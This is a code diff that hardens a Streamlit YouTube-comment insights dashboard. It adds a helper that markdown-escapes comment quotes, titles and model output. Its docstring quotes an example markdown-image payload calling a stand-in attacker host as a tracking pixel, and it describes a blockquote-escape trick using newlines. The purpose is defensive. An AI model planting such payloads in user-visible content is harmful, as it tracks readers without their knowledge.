@@ -8,10 +8,13 @@ synthesizing insights — runs in a background thread (orchestration.py),
 never blocking this script; this file only starts that job, polls its
 Postgres-backed progress (`st.status`, refreshed via `streamlit_autorefresh`
 rather than a real blocking wait), and renders SPEC §3's three insight
-blocks once it's done. SPEC §10 invariant 4 holds throughout: every
-comment quote goes through plain `st.markdown` with Streamlit's default
-HTML-escaping left untouched, so no raw markup or script from a comment
-ever renders as anything but literal text.
+blocks once it's done. SPEC §10 invariant 4 holds throughout, via
+`_as_literal_text`: every string that originates outside this system —
+comment quotes, YouTube-supplied titles, and model output derived from
+either — is markdown-escaped before it reaches `st.markdown`, so nothing
+a commenter writes can render as anything but literal text. Streamlit's
+default HTML escaping is left untouched underneath that, but it is not
+sufficient on its own; see `_as_literal_text` for why.
 
 Module layout: the functions above `main()` are plain, framework-free
 logic (URL validation via ingestion.youtube, the SPEC §4.4 quota
@@ -26,6 +29,7 @@ from __future__ import annotations
 import asyncio
 import logging
 import os
+import re
 
 import altair as alt
 import httpx
@@ -682,6 +686,35 @@ def _render_in_progress(job_id: str, progress: JobProgress) -> None:
             st.warning("Cancellation requested — this may take a moment to stop.")
 
 
+# Every ASCII punctuation character markdown gives meaning to, plus `$`
+# (Streamlit renders LaTeX between dollar signs) and `<`/`>`.
+_MARKDOWN_SPECIALS = re.compile(r"([\\`*_{}\[\]()#+\-.!|~<>$])")
+
+
+def _as_literal_text(value: str) -> str:
+    """Render untrusted text as text, not as markup.
+
+    Streamlit escapes HTML by default, and that was mistaken for the whole
+    defence. It is not: `st.markdown` still *renders markdown*, and markdown
+    can reach the network without a single HTML tag. A comment reading
+    `![](https://attacker.example/p?u=creator)` becomes a live image
+    request fired from the creator's browser the moment they open their
+    report — a tracking pixel with no script and no tag. `[text](url)`
+    becomes a real, clickable link, which is the same problem wearing a
+    friendlier face.
+
+    Quotes are the sharpest case because they are verbatim attacker-chosen
+    strings, but model output is not trustworthy either: it is *derived*
+    from those comments and can carry the syntax straight through. So
+    everything that did not originate in this codebase goes through here.
+
+    Newlines are collapsed as well: a bare newline inside `> {quote}` ends
+    the blockquote and lets the rest of the comment render as top-level
+    markdown, which is the same escape by a different door.
+    """
+    return _MARKDOWN_SPECIALS.sub(r"\\\1", " ".join(value.split()))
+
+
 def _render_insights(
     insights: ChannelInsights,
     *,
@@ -701,38 +734,38 @@ def _render_insights(
         st.caption("No clear content requests surfaced in this batch of comments.")
     for r in insights.requests:
         with st.container(border=True):
-            st.subheader(r.theme)
+            st.subheader(_as_literal_text(r.theme))
             st.caption(f"Mentioned in {r.mention_count} comments")
-            st.markdown(f"**Suggested title:** {r.suggested_title}")
+            st.markdown(f"**Suggested title:** {_as_literal_text(r.suggested_title)}")
             for quote in r.quotes:
-                st.markdown(f"> {quote}")
+                st.markdown(f"> {_as_literal_text(quote)}")
 
     st.header("Where your explanation didn't land")
     if not insights.confusion_points:
         st.caption("No recurring confusion points surfaced in this batch of comments.")
     for c in insights.confusion_points:
         with st.container(border=True):
-            st.subheader(c.sticking_point)
+            st.subheader(_as_literal_text(c.sticking_point))
             caption = f"Mentioned in {c.mention_count} comments"
             if c.timestamp_hint:
                 caption += f" · around {c.timestamp_hint}"
             st.caption(caption)
             for quote in c.quotes:
-                st.markdown(f"> {quote}")
+                st.markdown(f"> {_as_literal_text(quote)}")
 
     st.header("Which video landed badly")
     if not insights.video_moods:
         st.caption("No video stood out as underperforming emotionally in this batch.")
     for v in insights.video_moods:
         with st.container(border=True):
-            st.subheader(v.video_title)
+            st.subheader(_as_literal_text(v.video_title))
             st.caption(
                 f"Sentiment {v.sentiment_score:+.2f} "
                 f"({v.delta_vs_channel_avg:+.2f} vs. channel average)"
             )
-            st.markdown(f"**Likely driver:** {v.top_negative_driver}")
+            st.markdown(f"**Likely driver:** {_as_literal_text(v.top_negative_driver)}")
             for quote in v.quotes:
-                st.markdown(f"> {quote}")
+                st.markdown(f"> {_as_literal_text(quote)}")
 
 
 if __name__ == "__main__":
